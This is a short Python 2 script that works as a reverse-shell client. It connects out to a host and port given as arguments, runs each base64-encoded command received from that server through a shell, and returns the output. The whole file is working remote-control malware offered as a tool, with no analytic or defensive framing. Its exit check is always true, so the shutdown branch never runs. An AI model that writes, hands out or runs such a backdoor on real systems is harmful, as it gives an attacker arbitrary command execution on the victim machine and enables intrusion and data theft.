#!/usr/bin/env python
#__*__ coding:utf-8__*__

import socket
import sys
import subprocess as sp

YELLOW, GREEN, RED, END = '\033[1;33m', '\033[1;32m', '\033[1;31m', '\033[0m'

def main():
    if len(sys.argv) != 3:
        print RED + '[-] Usage : client.py <address> <port>' + END
        sys.exit(1)
    server = str(sys.argv[1])
    try:
        port = int(sys.argv[2])
    except ValueError:
        print RED + '[-] Error : <port> value must be an integer' + END
        sys.exit(1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    while True:
        command = str(s.recv(2048)).decode('base64', 'strict').rstrip()
        if command != 'exit' or command != 'quit':
            cmd = sp.Popen(command, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
            out, err = cmd.communicate()
            res = str(out) + str(err)
            size = str(len(res)).zfill(16)
            msg = size + res
            s.send(msg.encode('base64', 'strict'))
        else:
            print RED + '[-] Shutting down connection to server...' + END
            s.close()
            sys.exit(0)

if __name__ == '__main__':
    main()
